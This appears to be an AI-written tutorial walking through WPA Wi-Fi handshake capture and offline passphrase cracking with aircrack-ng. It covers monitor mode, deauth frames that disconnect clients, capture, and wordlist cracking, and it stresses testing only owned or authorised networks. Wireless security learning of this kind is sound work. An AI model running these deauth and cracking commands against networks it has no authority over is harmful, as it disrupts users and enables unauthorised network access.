# Guides

1. Install tools
2. Find your wireless interface name
3. Scan (managed mode) to find **BSSID** and **channel** for the target SSID
4. Put the interface into **monitor mode**
5. Run `airodump-ng` to capture packets for that BSSID/channel
6. In a second terminal send a few **deauth** frames to force a client re-auth (trigger handshake)
7. Wait until `airodump-ng` shows **WPA handshake:** for that BSSID
8. Stop capture and run `aircrack-ng` (offline) against the `.cap` with your wordlist
9. Restore the interface to normal (stop monitor mode, restart NetworkManager)

# Requirments 

> **Monitor Mode:** (**needed**)

---

## 1) Install required tools

```bash
sudo apt update
sudo apt install iw aircrack-ng wireless-tools net-tools -y
```

**Why / what it does**

* `iw`: modern wireless utility (shows capabilities).
* `aircrack-ng`: suite (airodump, aireplay, aircrack) for capture/injection/cracking.
* `wireless-tools` / `net-tools`: helpful legacy utilities.
* `-y` auto-confirms install.

---

## 2) Find your wireless interface name

```bash
ip link show
```

**What to look for**

* Interface names: `wlan0`, `wlp2s0`, `wlan1`, etc.
* Choose the wireless one. Use that name in later commands (replace `wlan0` with your name).

---

## 3) (Optional) Check monitor support

```bash
iw list | grep -A 10 "Supported interface modes"
```

**Why**

* Look for `* monitor` in the output — this confirms your card can go into monitor mode and capture raw 802.11 frames.

---

## 4) Make sure interface is in managed mode, then scan to find BSSID & channel

If you’re currently in monitor mode stop it first (replace names accordingly):

```bash
sudo airmon-ng stop <iface>mon      # stop monitor interface if present
sudo ip link set <iface> up         # bring interface up in managed mode
```

Scan to find the target:

```bash
sudo iwlist <iface> scan | grep -E 'Address|Channel|ESSID'
# or (easier)
nmcli device wifi list
```

**What to extract**

* `ESSID`: the SSID (name) — e.g. `T0fu`
* `Address` / `BSSID`: MAC of the AP — e.g. `AA:BB:CC:DD:EE:FF`
* `Channel`: numeric Wi-Fi channel — e.g. `6`

**Why**

* You need BSSID + channel so the capture focuses only on that AP (less noise, faster capture).

---

## 5) Put the interface into monitor mode

```bash
sudo airmon-ng check kill          # kills NetworkManager/other processes that interfere
sudo airmon-ng start <iface>       # creates <iface>mon (e.g. wlp2s0mon)
```

**Explanation**

* `airmon-ng start` switches the adapter into monitor mode and typically creates a new interface with `mon` suffix.
* `check kill` stops processes (NetworkManager, wpa\_supplicant) that would block monitor/injection.

**Result**

* You’ll see a new interface (e.g. `wlp2s0mon`) used for sniffing raw 802.11 packets.

---

## 6) Start airodump-ng to capture traffic for that BSSID/channel

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 --write t0fu-handshake wlp2s0mon
```

**Breakdown**

* `--bssid AA:BB:...`: target exact MAC (captures only that AP’s frames)
* `-c 6`: lock to channel 6 (prevents hopping)
* `--write t0fu-handshake`: filename prefix for capture files (creates `.cap`)
* `wlp2s0mon`: your monitor interface

**What you’ll see**

* A top header with AP info and (if captured) `WPA handshake: AA:BB:...`

---

## 7) In a second terminal, force a deauthentication to trigger the 4-way handshake

```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlp2s0mon
```

**Why**

* Deauth packets kick a connected client off the AP. When the client reconnects, the 4-way handshake happens — and `airodump-ng` can capture it.
* `--deauth 5` sends 5 deauth frames (increase if nothing happens). `-a` is the AP BSSID.

**Important**

* Only do this on networks you own or have permission to test.

---

## 8) Watch airodump-ng for the handshake. When it appears: stop capture

Look at the airodump top area. When it shows:

```
WPA handshake: AA:BB:CC:DD:EE:FF
```

Press `Ctrl+C` in the terminal running `airodump-ng`.
**Files produced**: `t0fu-handshake-01.cap` (or `-02.cap`, etc).

**Why stop**

* You have what you need (handshake). No need to keep capturing.

---

## 9) Crack the capture offline using a wordlist

Make a small wordlist (example):

```bash
echo "11112222" > mywordlist.txt
```

Crack with aircrack-ng:

```bash
aircrack-ng t0fu-handshake-02.cap -w mywordlist.txt
```

**What happens**

* `aircrack-ng` reads the handshake from the `.cap` file and tests each password in `mywordlist.txt` by trying to derive keys and verify the handshake cryptographically — **no live contact with the AP**.

**Success output example**

```
KEY FOUND! [ 11112222 ]
```

If the key is not in the list, aircrack will finish without `KEY FOUND`.

---

## 10) Restore normal operation (bring everything back to managed Wi-Fi)

```bash
sudo airmon-ng stop wlp2s0mon          # stop monitor mode
sudo systemctl restart NetworkManager  # restart network manager so it re-manages interfaces
sudo ip link set wlp2s0 up             # bring up interface if needed
```

**Why**

* `airmon-ng check kill` killed network services earlier. Restarting NetworkManager returns network control to your OS, and you can connect to Wi-Fi normally.

**Optional cleanup**

```bash
rm t0fu-handshake-*.cap mywordlist.txt
```

---

# What each tool actually does — short conceptual notes

* **`iw`**: kernel/driver interface inspection. Shows capabilities like supported modes (monitor, AP, managed).
* **`airmon-ng`**: convenience script to switch interfaces into monitor mode and handle interfering processes.
* **`airodump-ng`**: passive/sniffing tool — listens and writes raw 802.11 frames to a capture file. Shows nearby APs and clients.
* **`aireplay-ng`**: packet injection — for tests like deauth that cause clients to reconnect (used in testing only).
* **`aircrack-ng`**: offline cracker — given a capture with a handshake, it tests passphrases from a list and verifies which one reproduces the handshake keys.

---

# Expected outputs & what success looks like

1. `airodump-ng` header shows AP line and at top:

   ```
   WPA handshake: AA:BB:CC:DD:EE:FF
   ```

   — this means handshake captured.

2. `aircrack-ng` on the `.cap` file prints:

   ```
   Opening t0fu-handshake-02.cap (802.11 WPA handshake)
   Read X packets
   KEY FOUND! [ 11112222 ]
   ```

   — that is a successful crack.

If there’s no `KEY FOUND`, the attempted passphrases were not in the wordlist.

---

# Safety, legality, and best practice (don’t skip)

* **Only test networks you own or have explicit permission to test.**
* Deauth packets disrupt users; use minimal counts and only on your networks.
* Keep captures private — they contain sensitive handshake info.
* If you’re practicing, set up a disposable AP (phone hotspot) to test safely.

---

If you want, I can:

* Convert these steps into a single annotated script for *your* interface name (so you can copy-paste), or
* Show how to create a better wordlist (rules, masks) or how to use `hashcat` (GPU) for faster cracking (educational only).

Which do you want next — the annotated script for your X230, or deeper explanation of the cryptography behind the handshake?
